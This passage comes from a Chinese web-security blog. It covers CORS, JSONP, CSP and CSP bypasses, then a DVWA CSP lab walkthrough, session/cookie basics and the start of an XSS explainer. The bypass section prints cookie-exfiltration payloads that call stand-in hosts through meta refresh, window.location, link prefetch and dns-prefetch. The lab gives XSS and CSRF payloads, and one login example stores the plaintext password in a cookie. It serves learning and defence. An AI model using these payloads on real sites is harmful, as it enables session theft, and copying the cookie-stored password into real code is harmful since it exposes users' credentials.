可以看到在请求中，我们填的是PUT，但是这里产生的却是OPTIONS，前面我们也说了，非简单请求会先产生一次预检请求，带上origin和真实的方法在这里是PUT，服务端验证通过了origin和方法之后，浏览器才会使用真实的方法PUT发送一次请求。 我们还没有在服务端返回头部告诉浏览器说我们支持PUT方法，所以浏览器这里拿不到权限，报错了。 我们在服务端的代码添加头部 1234&lt;?phpheader(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);header(&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;); // 需要同意两种类型，就用逗号隔开echo &quot;来自index2.php的内容&quot;; 到这里就可以正常的请求了，但是可以在浏览器中看到，产生了两次请求，也就是说php脚本执行了两次。 我们例子中只是简单输出一个字符，如果是查询数据库等操作呢？ 是不是就多出了一次无用的请求。 所以我们可以在服务端拦截预检请求，直接返回同意访问的头部，后面的脚本就不需要执行了。 还有前面的简单请求，哪怕是还没有添加信任，跨域请求失败，脚本也一样会运行。 1这是因为http协议并没有跨域的概念，请求发送了就会执行，而到达了浏览器的时候，才由浏览器解析响应头，查看是否有相应的字段来决定要不要继续执行。 123456789101112&lt;?php// 如果不是同意的来源 就不用运行了if (strpos($_SERVER[&#x27;HTTP_ORIGIN&#x27;], &#x27;http://www.siam.com&#x27;) === false)&#123; die;&#125;header(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);// 如果是预检请求，则通知信任即可，不需要执行脚本。if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;OPTIONS&#x27;)&#123; header(&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;); die;&#125;echo &quot;来自index2.php的内容&quot;; 总的意思就是请求不是同意的来源以及请求是预检测我都不执行脚本 同时我们可以看一下，是否每一个非简单请求都需要先发送预检请求。我们在一个页面连续请求两次 1234567891011121314$.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); $.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125; &#125;) &#125;&#125;) 发现浏览器只有请求了3次：1次OPTIONS，2次PUT。 1在一个页面中，预检操作只需要进行一次。 12345优点CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。支持所有类型的 HTTP 请求。缺点第一次发送非简单请求时会多一次请求，增加服务器压力。 JSONP 跨域解决通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。 1234567&lt;script src=&quot;http://steady.com/data.php?callback=steady&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; function steady(jsondata)&#123; //处理获得的json数据 &#125;&lt;/script&gt; 首先我们在html中写下以下代码，创建一个script，调用动态脚本 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Siam - script 同源解决&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;这是原始页面的内容&lt;/h1&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // 这里需要先写好相应的回调处理函数，然后服务端的脚本调用 传参 function test(text)&#123; $(&#x27;body&#x27;).append(text); &#125; $(function()&#123; $(&quot;body&quot;).append(&quot;&lt;script src=&#x27;http://www.siam2.com/script.php&#x27;&gt;&lt;\\/script&gt;&quot;); &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 服务端脚本: 123&lt;?phpecho &quot;test(&#39;这是返回内容&#39;)&quot;;?&gt; 优点： 1它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。 缺点： 1它只支持&#96;GET&#96;请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。 服务器代理除了使用以上的两种方案，我们还可以在nginx配置反向代理，在www.siam.com下某个路径代理到www.siam2.com即可 我们打开nginx.conf 12345678910111213server &#123; listen 80; server_name www.siam.com; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root html; index index.html index.htm; &#125; location ^~ /apis &#123; proxy_pass http://www.siam2.com; &#125;&#125; 通过反向代理，我们就可以通过 www.siam.com/apis/index2.php 这个路径来访问原来部署在www.siam2.com下的内容。 这样子就是同源请求了。 CSP概念​ CSP全称Content Security Policy ,可以直接翻译为内容安全策略,为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则,指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源），明确告诉客户端，哪些外部资源可以加载和执行。通过CSP协定，让WEB处于一个安全的运行环境中。 设置方式Content-Security-Policy一种是通过 HTTP 头信息的Content-Security-Policy的字段。 12Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;style-src cdn.example.org third-party.org; child-src https: &lt;meta&gt;1&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt; 上面代码中，CSP 做了如下配置。 12345脚本：只信任当前域名&lt;object&gt;标签：不信任任何URL，即不加载任何资源样式表：只信任cdn.example.org和third-party.org框架（frame）：必须使用HTTPS协议加载其他资源：没有限制 策略指令 指令 说明 default-src 定义资源默认加载策略 connect-src 定义 Ajax、WebSocket 等加载策略 font-src 定义 Font 加载策略 frame-src 定义 Frame 加载策略 img-src 定义图片加载策略 media-src 定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略 object-src 定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略 script-src 定义 JS 加载策略 style-src 定义 CSS 加载策略 sandbox 值为 allow-forms，对资源启用 sandbox report-uri 值为 /report-uri，提交日志 内容源 源 说明 * 通配符，允许任何URL，除了data: blob: filesystem: schemes *.foo.com 允许加载foo.com子域的资源 abc.foo.com 只能加载这个域名下的资源 https://a.com 只能用HTTPS加载域名下的资源 https: 通过HTTPS可以加载任意域名下的资源 ‘none’ 代表空集,即不匹配任何URL,两侧单引号是必须的 ‘self’ 代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的 ‘unsafe-inline’ 允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的 ‘unsafe-eval’ 允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的 data: 允许data: URI作为内容来源 mediastream: 允许mediastream: URI作为内容来源 例子1Content-Security-Policy: default-src &#39;self&#39; steady.foo.com 默认的内容源必须为同源或者是steady.foo.com nonce script CSP和strict-dynamicnonce script CSP1234&lt;?phpHeader(&quot;Content-Security-Policy: script-src &#x27;nonce-&quot;.$random.&quot; &#x27;&quot;);?&gt;&lt;script nonce=&quot;&lt;?php echo $random?&gt;&quot;&gt; 这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。 strict-dynamic1Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;strict-dynamic&#39; CSP Bypass的方法总结CSP对前端攻击的防御主要有两个： 限制js的执行。 限制对不可信域的请求。 绕过方式url跳转在default-src ‘none‘的情况下，可以使用meta标签实现跳转 1&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot; &gt; 在允许unsafe-inline的情况下 用window.location，或者window.open之类的方法进行跳转绕过 123&lt;script&gt; window.location&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;;&lt;&#x2F;script&gt; &lt;a&gt;标签配合站内的某些可控JS点击操作来跳转 1234&lt;script&gt; $(#foo).click()&lt;&#x2F;script&gt;&lt;a id&#x3D;&quot;foo&quot; href&#x3D;&quot;xxxxx.com&quot;&gt; 利用网站本身的跳转接口 1http:&#x2F;&#x2F;foo.com&#x2F;jmp.php?url&#x3D;attack.com &lt;link&gt;标签预加载CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据。 1&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;&gt; 在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie 1&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;[cookie].xxx.ceye.io&quot;&gt; 利用浏览器补全有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样 1Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39; 插入点 12&lt;p&gt;插入点&lt;&#x2F;p&gt;&lt;script nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt; payload 1&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot; 浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定 12&lt;p&gt;&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;&lt;&#x2F;p&gt;&lt;script&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt; DVWA-CSP靶场src属性1&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;myscripts.js&quot;&gt;&lt;&#x2F;script&gt; src 属性规定外部脚本文件的 URL。 有时，我们需要在网站的多个页面中运行 JavaScript。不需要重复编写相同的脚本，只需在单独的文件中创建 JavaScript，并以 .js 为后缀保存，然后使用\\ 标签中的 src 属性引用该文件即可。 注释：外部文件不能包含 标签！ Low源码分析 123456789101112131415161718192021222324252627&lt;?php//定义script脚本执行策略，可以看到只允许本域、以及一下网站https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.//设置CSP头header($headerCSP);# These might work if you can&#x27;t create your own for some reason# https://pastebin.com/raw/R570EE00# https://hastebin.com/raw/ohulaquzex?&gt;&lt;?php//接受include参数if (isset ($_POST[&#x27;include&#x27;])) &#123;//拼接参数$page[ &#x27;body&#x27; ] .= &quot; &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#x27;; 构造payload 1https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;jWN8HLKe https://pastebin.com是一个快速文本分享网站，我们可以插入我们的xss代码。 配合CSRF，诱惑用户自动触发漏洞。 123456789101112131415&lt;form id=&quot;csp&quot; name=&quot;csp&quot; method=&quot;POST&quot; action=&quot;http://192.168.1.200/DVWA-master/vulnerabilities/csp/&quot;&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot;&gt; &lt;script&gt; var cspb = document.getElementById(&quot;csp&quot;); cspb[0].value=&quot;https://pastebin.com/raw/rcBeKDgL&quot;; cspb.submit(); &lt;/script&gt; &lt;/form&gt; Medium源码 12345678910111213141516171819202122232425&lt;?php//js脚本只允许本域、允许使用内联资源、而且设置了nonce属性$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;;header($headerCSP);// Disable XSS protections so that inline alert boxes will workheader (&quot;X-XSS-Protection: 0&quot;);# &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;&lt;/form&gt;&#x27;; 构造payload 可以加载本地的script并且需要nonce值。 1&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(1)&lt;&#x2F;script&gt; High源码 1234567891011121314151617181920212223&lt;?php//只能加载本地的script$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;header($headerCSP);?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;&lt;/form&gt;&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;&#x27;; 分析../..//vulnerabilities/csp/source/jsonp.php 1234567891011121314&lt;?phpheader(&quot;Content-Type: application&#x2F;json; charset&#x3D;UTF-8&quot;);if (array_key_exists (&quot;callback&quot;, $_GET)) &#123; $callback &#x3D; $_GET[&#39;callback&#39;];&#125; else &#123; return &quot;&quot;;&#125;$outp &#x3D; array (&quot;answer&quot; &#x3D;&gt; &quot;15&quot;);echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;?&gt; high.js文件 1234567891011121314151617181920//创建&lt;script&gt;标签，并添加src属性source/jsonp.php?callback=solveSum，其中solveSum是一个函数，用来添加anser的值。function clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp.php?callback=solveSum&quot;; document.body.appendChild(s);&#125;//添加代码之后，会将answer的值打印出来，这里如果我们将callback的值修改为文本的值也会打印出来。function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125;&#125;var solve_button = document.getElementById (&quot;solve&quot;);//点击按钮之后会触发clickButton函数，该函数会添加前端代码。if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;);&#125; 构造payload–直接赋予callback值payload 1include&#x3D;&lt;script src&#x3D;source&#x2F;jsonp.php?callback&#x3D;alert(document.cookie)&gt;&lt;&#x2F;script&gt; Impossible1234567891011121314151617181920212223&lt;?php$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;header($headerCSP);?&gt;&lt;?phpif (isset ($_POST[&#x27;include&#x27;])) &#123;$page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &#x27;&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;&lt;/form&gt;&lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt;&#x27;; Impossible.js 1234567891011121314151617181920//添加script代码function clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp_impossible.php&quot;; document.body.appendChild(s);&#125;function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125;&#125;var solve_button = document.getElementById (&quot;solve&quot;);if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;);&#125; source/jsonp_impossible.php 12345678//这里没有参数值接受参数也就无法输出js代码。&lt;?phpheader(&quot;Content-Type: application/json; charset=UTF-8&quot;);$outp = array (&quot;answer&quot; =&gt; &quot;15&quot;);echo &quot;solveSum (&quot;.json_encode($outp).&quot;)&quot;;?&gt;","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"session、cookie原理","slug":"session、cookie原理","date":"2019-06-22T01:20:56.000Z","updated":"2020-10-07T02:21:12.056Z","comments":true,"path":"2019/06/22/session、cookie原理/","link":"","permalink":"http://s1eady.top/2019/06/22/session%E3%80%81cookie%E5%8E%9F%E7%90%86/","excerpt":"","text":"session、cookie原理登陆前session_start() 用户第一次访问文件(含有session_start函数的文件) 用户第一次访问是没有PHPSESSID,所以会创建$_SESSION变量,同时创建sess_abc123的session文件,将abc123作为PHPSESSID的值返回给浏览器 比如: 我们在从未提交过表单,也就是没有访问login.php,因此session_start函数不会触发,PHPSESSID也不会存在 cookie中不会存在任何PHPSESSID值 没有访问服务器之前,我们的请求是不会带上PHPSESSID的 用户提交表单到服务器(login.php),此时无论是否密码、账号是否正确,都会出发session_start函数,进而生成PHPSESSID值 然后我们在每一个请求服务器的时候都会带上PHPSESSID 登陆后登陆之后,通过以下代码设置cookie 12setcookie(&quot;username&quot;,$username,time()+7*24*60*60); setcookie(&quot;code&quot;,$password,time()+7*24*60*60); 我们在前端可以使用js获取到cookie值 HttpOnly设置每个cookie都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过cookie选项来设置的，cookie选项包括：expires、domain、path、secure、HttpOnly。在设置任一个cookie时都可以设置相关的这些属性，当然也可以不设置，这时会使用这些属性的默认值。在设置这些属性时，属性之间由一个**分号和一个空格**隔开。 这个选项用来设置cookie是否能通过 js 去访问。默认情况下，cookie不会带httpOnly选项(即为空)，所以默认情况下，客户端是可以通过js代码去访问（包括读取、修改、删除等）这个cookie的。当cookie带httpOnly选项时，客户端则无法通过js代码去访问（包括读取、修改、删除等）这个cookie。 注意:只有设置了setcookie的第七个参数为true的时候 document.cookie才是空的,即使在php.ini里面设置了session.cookie_httponly=On并且设置了session.cookie_httponly 这个属性(ini_set(&quot;session.cookie_httponly&quot;, 1);)，但是在浏览器还是能获取到cookie的信息,只要setcookie的第七个参数不设置为true,document.cookie依然能取到值。 源码login.html 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; xml:lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;&#x2F;&gt; &lt;title&gt;会员登录&lt;&#x2F;title&gt; &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt; ul li&#123;margin:0;padding:0;&#125; form&#123;margin:40px 30px 0;&#125; form li&#123;list-style:none;padding:5px 0;&#125; form li label&#123;float:left;width:70px;text-align:right&#125; form li a&#123;font-size:12px;color:#999;text-decoration:none&#125; .login_btn&#123;border:none;background:#01A4F1;color:#fff;font-size:14px;font-weight:bold;height:28px;line-height:28px;padding:0 10px;cursor:pointer;&#125; form li img&#123;vertical-align:top&#125; &lt;&#x2F;style&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;用户登录&lt;&#x2F;legend&gt; &lt;ul&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt;用户名:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt;密码:&lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;remember&quot; value&#x3D;&quot;yes&quot;&#x2F;&gt;7天内自动登录 &lt;&#x2F;li&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;login&quot; value&#x3D;&quot;登录&quot; class&#x3D;&quot;login_btn&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; Login.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(isset($_POST[&#39;login&#39;])) &#123; $username &#x3D; trim($_POST[&#39;username&#39;]); $password &#x3D; trim($_POST[&#39;password&#39;]); if(($username&#x3D;&#x3D;&#39;&#39;)||($password&#x3D;&#x3D;&#39;&#39;)) &#123; header(&#39;refresh:3;url&#x3D;login.html&#39;); echo &quot;改用户名或密码不能为空，3秒后跳转到登录页面&quot;; exit; &#125; else if(($username!&#x3D;&#39;username&#39;)||($password!&#x3D;&#39;password&#39;)) &#123; &#x2F;&#x2F;用户名或密码错误 header(&#39;refresh:3;url&#x3D;login.html&#39;); echo &quot;用户名或密码错误，3秒后跳转到登录页面&quot;; exit; &#125; else if(($username&#x3D;&#x3D;&#39;username&#39;)&amp;&amp;($password&#x3D;&#x3D;&#39;password&#39;)) &#123; &#x2F;&#x2F;登录成功将信息保存到session中 $_SESSION[&#39;username&#39;]&#x3D;$username; $_SESSION[&#39;islogin&#39;]&#x3D;1; &#x2F;&#x2F;如果勾选7天内自动保存，则将其保存到cookie if($_POST[&#39;remember&#39;]&#x3D;&#x3D;&quot;yes&quot;) &#123; setcookie(&quot;username&quot;,$username,time()+7*24*60*60); setcookie(&quot;code&quot;,$password,time()+7*24*60*60); &#125; else &#123; setcookie(&quot;username&quot;,&#39;&#39;,time()-1); setcookie(&quot;code&quot;,&#39;&#39;,time()-1); &#125; &#x2F;&#x2F;跳转到用户首页 header(&#39;refresh:3;url&#x3D;index.php&#39;); &#125; &#125; ?&gt; Index.php 1234567891011121314151617181920&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); session_start(); //首先判断Cookie是否有记住用户信息 if(isset($_COOKIE[&#x27;username&#x27;])) &#123; $_SESSION[&#x27;username&#x27;]=$_COOKIE[&#x27;username&#x27;]; $_SESSION[&#x27;islogin&#x27;]=1; &#125; if(isset($_SESSION[&#x27;islogin&#x27;])) &#123; //已经登录 echo $_SESSION[&#x27;username&#x27;].&quot;:你好，欢迎进入个人中心！&lt;br/&gt;&quot;; echo &quot;&lt;a href=&#x27;logout.php&#x27;&gt;注销&lt;/a&gt;&quot;; &#125; else &#123; //为登录 echo &quot;你还未登录，请&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;; &#125; ?&gt; Logout.php 12345678910111213&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); session_start(); //清除session $username=$_SESSION[&#x27;username&#x27;]; $_SESSION=array(); session_destroy(); //清除cookie setcookie(&quot;username&quot;,&#x27;&#x27;,time()-1); setcookie(&quot;code&quot;,&#x27;&#x27;,time()-1); echo &quot;$username,欢迎下次光临&quot;; echo &quot;重新&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;; ?&gt; session与cookie的区别Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器 网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies 。 cookie的作用就是为了解决HTTP协议无状态的缺陷所作的努力。 服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie。然而纯粹的客户端脚本如JavaScript也可以生成cookie。 cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的 session机制是一种服务器端的机制，session由服务端生成，每一个session对应一个session id，session id将被在本次响应中返回给客户端保存，可以保存在cookie中。 1、存储方式不同 Cookie中只能保管ASCII字符串 Session中能够存取任何类型的数据 2、隐私策略的不同 Cookie存储在客户端阅读器中，对客户端是可见的，客户端的一些程序可能会窥探、复制以至修正Cookie中的内容。 Session存储在服务器上，对客户端是透明的，不存在敏感信息泄露的风险 3、跨域支持上的不同 Cookie支持跨域名访问 Session仅在他所在的域名内有效 4、cookie数据存放在客户的浏览器（客户端）上，session数据放在服务器上，但是服务端的session的实现对客户端的cookie有依赖关系的； 5、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session； session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE； 6、单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能超过3K； cookie如何生成？1、由服务端生成，在返回包中的set-cookie选项设置cookie。 2、前端浏览器通过js设置cookie。 什么是session？Session是一种协议，是保持用户状态的协议 客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session。","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Cookie与Session","slug":"Cookie与Session","permalink":"http://s1eady.top/tags/Cookie%E4%B8%8ESession/"}]},{"title":"xss漏洞","slug":"xss","date":"2019-06-22T01:20:56.000Z","updated":"2020-10-07T03:24:46.446Z","comments":true,"path":"2019/06/22/xss/","link":"","permalink":"http://s1eady.top/2019/06/22/xss/","excerpt":"","text":"xss原理攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。 危害 窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户操作。 监听用户行为：通过恶意 js 脚本，可以做到监听用户各种事件，比如获取登陆的键入字符串完成 hack 用户信息。 更改 DOM 结构：比较常见的就是通过运营商或者路由器添加浮窗广告，增收自身收入。 分类反射型xss原理只发生一次攻击，攻击代码不经过数据库，恶意代码提交到服务器，服务器解析并响应，浏览器最后执行恶意代码 常见漏洞位置网站搜索框、用户登录入口、注入表单的地方。 存储型xss原理可发生多次攻击，攻击者利用各种办法把恶意代码存储在受害者的数据库中，当用户每次取出恶意数据的时候出发恶意代码。 常见漏洞位置论坛、博客等留言位置、评论位置。 DOM型XSS原理 DOM（Document Object Model）即文档对象模型，通过 JavaScript，您可以重构整个HTML文档。您可以添加、移除、改变或重排页面上的项目。要改变页面的某个东西。对HTML 元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。 攻击者可以控制一些DOM对象、输入一些恶意JS代码，插入DOM结构，然后未做任何过滤直接输出到页面。 比如： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;DOM 